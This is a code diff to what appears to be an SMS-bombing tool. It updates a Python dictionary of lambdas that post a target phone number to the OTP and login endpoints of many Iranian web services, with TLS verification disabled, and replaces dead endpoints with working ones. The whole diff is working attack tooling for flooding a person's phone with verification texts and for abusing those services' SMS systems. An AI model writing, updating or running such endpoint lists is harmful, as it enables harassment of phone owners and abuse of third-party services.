@@ -179,16 +179,16 @@ SERVICES = {
     ),
 
     'shab': lambda num: requests.post(
-        url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
+        url="https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
         json={"mobile": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
         verify=False
     ),
 
-    'itoll': lambda num: requests.post(
-        url="https://app.itoll.ir/api/v1/auth/login",
-        json={"mobile": num},
+    'tapsishop': lambda num: requests.post(
+        url="https://tapsi.shop/api/proxy/authCustomer/CreateOtpForRegister",
+        json={"user": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
         verify=False
@@ -298,9 +298,9 @@ SERVICES = {
         verify=False
     ),
 
-    'exo': lambda num: requests.post(
-        url="https://exo.ir/index.php?route=account/mobile_login",
-        json={"mobile_number": num},
+    'karafs': lambda num: requests.post(
+        url="https://v2.karafsapp.com/requestCode",
+        json={"phoneNumber": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
         verify=False
@@ -386,9 +386,9 @@ SERVICES = {
         verify=False
     ),
 
-    'cinematicket': lambda num: requests.post(
-        url="https://cinematicket.org/api/v1/users/signup",
-        json={"phone_number": num},
+    'talasi': lambda num: requests.post(
+        url="https://api.talasea.ir/api/auth/sentOTP",
+        json={"phoneNumber": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
         verify=False
@@ -402,8 +402,8 @@ SERVICES = {
         verify=False
     ),
 
-    'kafegheymat': lambda num: requests.post(
-        url="https://kafegheymat.com/shop/getLoginSms",
+    'gharar': lambda num: requests.post(
+        url="https://gharar.ir/users/phone_number/",
         json={"phone": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
@@ -443,7 +443,7 @@ SERVICES = {
     ),
 
     'melix': lambda num: requests.post(
-        url="https://melix.shop/site/api/v1/user/otp",
+        url="https://api.algorock.com/api/Auth",
         json={"mobile": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
@@ -458,9 +458,9 @@ SERVICES = {
         verify=False
     ),
 
-    'sibbank': lambda num: requests.post(
-        url="https://api.sibbank.ir/v1/auth/login",
-        json={"phone_number": num},
+    'okala': lambda num: requests.post(
+        url="https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
+        json={"mobile": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
         verify=False
@@ -562,9 +562,9 @@ SERVICES = {
         verify=False
     ),
 
-    'offch': lambda num: requests.post(
-        url="https://api.offch.com/auth/otp",
-        json={"username": num},
+    'paresh': lambda num: requests.post(
+        url="https://api.paresh.ir/api/user/otp/code/",
+        json={"phone_number": num},
         headers={"Content-Type": "application/json"},
         timeout=5,
         verify=False
